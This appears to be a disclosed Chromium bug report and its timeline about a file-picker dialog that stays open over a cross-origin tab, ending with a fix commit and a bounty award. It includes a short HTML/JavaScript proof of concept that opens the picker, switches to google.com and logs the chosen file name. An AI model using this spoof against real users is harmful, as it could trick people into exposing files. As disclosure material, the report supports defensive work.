# Cross origin dialog spoof

| Field | Value |
|-------|-------|
| **Issue ID** | [337356054](https://issues.chromium.org/issues/337356054) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Storage>FileAPI, Blink>Storage>FileSystem |
| **Platforms** | Windows |
| **Chrome Version** | 125.0.0.0 |
| **Reporter** | li...@gmail.com |
| **Assignee** | fe...@chromium.org |
| **Created** | 2024-04-27 |
| **Bounty** | $3,000.00 |

## Description

# Steps to reproduce the problem

showOpenFilePicker dialog can be shown over a cross-origin page which might confuse a user into leaking sensitive information to an attacker

# Problem Description

Load below html
Click
Select a file
Check in console u can see file name there
Attaching video proof

<html>
<body onclick="f()">click me</body>
<p></p>
<script>
function f() {
const filePromise = window.showOpenFilePicker();
setTimeout(async () => {
window.open("https://google.com")
const handle = (await filePromise)[0];
console.log(`File: ${handle.name}`);
// ...
}, 0);
```
    }
 </script>

```
</html>

Similar issue <https://issues.chromium.org/40057597>

# Summary

Cross origin dialog spoof

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A

## Attachments

- [screen-capture (9).webm](attachments/screen-capture (9).webm) (video/webm, 1.8 MB)
- [index (5).html](attachments/index (5).html) (text/html, 348 B)

## Timeline

### li...@gmail.com (2024-04-27)

Checked in 
Version 126.0.6439.0 (Official Build) dev (64-bit)
Version 125.0.6422.14 (Official Build) beta (64-bit)
Version 124.0.6367.92 (Official Build) (64-bit)

### hc...@google.com (2024-04-29)

I'm having trouble reproing this; i suspect I might not have the html file correct. Can you upload the proper HTML file as the initial post seems to have some odd quoting/escaping?

### li...@gmail.com (2024-04-29)

Corrected

### pe...@google.com (2024-04-29)

Thank you for providing more feedback. Adding the requester to the CC list.

### hc...@google.com (2024-04-29)

Reproduced on stable windows 124.0.6367.63 (Official Build) (64-bit) (cohort: Control)

@finnur this feels much like <https://issues.chromium.org/issues/40057597> except its with a different system dialog; I see there was some discussion of a broader fix for all system dialogs but I don't know if I saw any discussion about a broader fix?

### pe...@google.com (2024-04-30)

Setting milestone because of s2 severity.

### pe...@google.com (2024-04-30)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### pe...@google.com (2024-05-14)

finnur: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ri...@google.com (2024-05-22)

[Secondary Security Shepherd]

Hi finnur@, per hchao@'s [comment #6](https://issues.chromium.org/issues/337356054#comment6), were there any discussions on a broader fix?

### pe...@google.com (2024-05-29)

finnur: Uh oh! This issue still open and hasn't been updated in the last 29 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### li...@gmail.com (2024-06-14)

Dear Team,
any updates
Tks


### li...@gmail.com (2024-10-30)

Dear Team,
any updates
Tks

### ts...@google.com (2024-10-31)

Ping finnur, any answer on this old issue?

### li...@gmail.com (2024-12-03)

Dear Team,
any updates
Tks

### li...@gmail.com (2024-12-13)

Dear Team,

Checked in Version 133.0.6888.2 (Official Build) dev (64-bit)
Issue is not resolved.
tks

### fi...@chromium.org (2024-12-13)

Apologies for the delay.

I never log into my chromium email explicitly. I setup a rule to forward everything that gets sent there to my Google account, but like so many others I discovered that the forwarding mechanism silently broke a very long time ago and I didn't notice.

As to your question:

> this feels much like https://issues.chromium.org/issues/40057597 except its with a different system dialog
> I see there was some discussion of a broader fix for all system dialogs but I don't know if I saw any discussion about a broader fix?

I think any similarities are superficial. This issue is with a system dialog on Desktop but the other security issue was with Chrome UI on Android.
I remember some talk about a broader fix, which I think is what we should be aiming for, but I don't know where that stands. 

I don't know who is an expert on the File Open picker on Desktop (it is not me), so I'll return this back.

### li...@gmail.com (2024-12-31)

Dear Team,

checked in Version 133.0.6905.0 (Official Build) dev (64-bit)
issue is not resolved

tks

### li...@gmail.com (2025-02-04)

Dear Team,

checked in Version 134.0.6988.2 (Official Build) dev (64-bit)

issue is not resolved

tks

### es...@chromium.org (2025-05-19)

Re-assigning as I don't think this bug ever got routed to a proper owner. mek@, do you know who own the File System Access API these days?

### me...@chromium.org (2025-05-21)

I believe @fe...@chromium.org's team owns the File System API these days.

### li...@gmail.com (2025-06-18)

Dear team,

Checked in Version 139.0.7232.3 (Official Build) dev (64-bit)

issue is not resolved

tks

### li...@gmail.com (2025-07-10)

Dear team,

Checked in Version 140.0.7259.2 (Official Build) dev (64-bit)
issue is not resolved
tks

### dx...@google.com (2025-09-25)

Project: chromium/src  

Branch:  main  

Author:  Fergal Daly [fergal@chromium.org](mailto:fergal@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6966639>

Close file picker dialog if the tab becomes invisible.

---


Expand for full commit details
```
     
    A previous fix for a similar bug (https://crrev.com/c/659915) added code 
    to not show the dialog if the tab is already invisible however there's 
    lots of opportunity for races. 
     
    This fixes that by making the FileSystemChooser a WebContentsObserver to 
    catch later changes. The observer is created immediately after checking 
    the visibility so there is no race. The old code is removed as it does 
    the checking at a point many steps away from creating the chooser. 
     
    The old unittest is removed rather than updated. The relevant code has 
    moved and rather write a new unittest, I'm relying on coverage in 
    content_browsertests and browser_tests. 
     
    The changes to file_system_chooser_unittest.cc are basically a no-op but 
    all of the tests need a WebContents instance now. 
     
    Bug: 419721056,337356054 
    Change-Id: I6d3fb55c4fc7c4468b6172cd505bef081060f722 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6966639 
    Reviewed-by: Joey Arhar <jarhar@chromium.org> 
    Commit-Queue: Fergal Daly <fergal@chromium.org> 
    Reviewed-by: Mingyu Lei <leimy@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1520251}

```

---

Files:

- M `chrome/browser/ui/views/file_system_access/file_system_access_browsertest.cc`
- M `content/browser/file_system_access/file_system_access_manager_impl.cc`
- M `content/browser/file_system_access/file_system_access_manager_impl_unittest.cc`
- M `content/browser/file_system_access/file_system_chooser.cc`
- M `content/browser/file_system_access/file_system_chooser.h`
- M `content/browser/file_system_access/file_system_chooser_browsertest.cc`
- M `content/browser/file_system_access/file_system_chooser_unittest.cc`
- M `content/public/test/file_system_chooser_test_helpers.cc`
- M `content/public/test/file_system_chooser_test_helpers.h`

---

Hash: [e46ff6303d1aa0c1b5d1f11eb91cba36eda84a06](https://chromiumdash.appspot.com/commit/e46ff6303d1aa0c1b5d1f11eb91cba36eda84a06)  

Date: Thu Sep 25 04:56:58 2025


---

### li...@gmail.com (2025-10-03)

Dear team,

I checked in version Version 143.0.7445.3 (Official Build) dev (64-bit) it's now fixed.
Showing this Uncaught (in promise) AbortError: Failed to execute 'showOpenFilePicker' on 'Window': The user aborted a request. Please mark it as fixed.

### sp...@google.com (2025-10-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
baseline ui spoofing


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-01-15)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/337356054)*
